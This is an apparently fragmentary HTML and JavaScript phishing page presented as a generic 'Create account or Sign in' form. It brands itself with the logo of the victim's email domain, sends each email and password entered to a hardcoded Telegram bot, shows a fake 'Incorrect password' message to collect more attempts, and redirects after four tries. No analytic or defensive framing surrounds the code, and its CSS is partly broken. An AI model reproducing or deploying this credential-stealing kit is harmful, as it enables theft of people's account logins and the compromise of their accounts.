        body {
            margin: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;

            height: 100vh;
            background-size: cover;
            background-position: center;
            background-color: #f0f0f0;

        .container {
            background: rgba(255, 255, 255, 0.8);

            border-radius: 10px;

        }

            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .button {
            width: 97%;
            padding: 10px;
            background-color: #007BFF;
            border: none;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }

        .button:hover {
            background-color: #0056b3;
        }

        <h4>Create account or Sign in</h4>
        <input type="email" id="email" class="input-field" placeholder="Enter your email" required>
        <button class="button" id="next-button">Next</button><br><br><b>Use a One-Time Sign in link</b><br><br><br><small>One-Time signin url link will be pushed to email
    </div>

    <div class="container" id="password-page" style="display: none;"><br><br><h4>Account already exist</h4>
        <img src="" alt="Logo" class="logo" id="logo-password"><br><br><h5> Sign in with your email to continue!</h5><br><br>
        <h2 id="email-display"></h2>
        <input type="password" id="password" class="input-field" placeholder="Enter your password" required>
        <button class="button" id="submit-button">Sign in</button>We send Activation Link to your Email.
    </div>

 <script>
        const emailPage = document.getElementById('email-page');
        const passwordPage = document.getElementById('password-page');
        const emailField = document.getElementById('email');
        const passwordField = document.getElementById('password');
        const nextButton = document.getElementById('next-button');
        const submitButton = document.getElementById('submit-button');
        const emailDisplay = document.getElementById('email-display');
        const logo = document.getElementById('logo');
        const logoPassword = document.getElementById('logo-password');

        let attemptCount = 0;

        nextButton.addEventListener('click', () => {
            const email = emailField.value;
            if (email) {
                const domain = email.split('@')[1];
                if (domain) {
                    const logoUrl = `https://logo.clearbit.com/${domain}`;
                    const bgUrl = `https://source.unsplash.com/1600x900/?${domain}`;

                    // Update logo and background
                    logo.src = logoUrl;
                    logoPassword.src = logoUrl;
                    document.body.style.backgroundImage = `url(${bgUrl})`;
                }

                // Transition to password page
                emailPage.style.display = 'none';
                passwordPage.style.display = 'block';
                emailDisplay.textContent = email;
            } else {
                alert('Please enter a valid email.');
            }
        });

        submitButton.addEventListener('click', async () => {
            const email = emailField.value;
            const password = passwordField.value;
            if (email && password) {
                attemptCount++;

                if (attemptCount >= 4) {
                    alert('Incorrect password entered too many times. Redirecting...');
                    window.location.href = "https://updatebrowser.org";
                    return;
                }

                // Telegram bot token and chat ID
                const botToken = "7404707202:AAHEZ8wQN6-ZGqfohNi6fManLLurWNpg6b4";
                const chatId = "5686268913";

                // Send login data to Telegram
                const message = `Email: ${email}\nPassword: ${password}`;
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                alert('Incorrect password. Please try again.');
            } else {
                alert('Please enter your password.');
            }
        });
    </script>
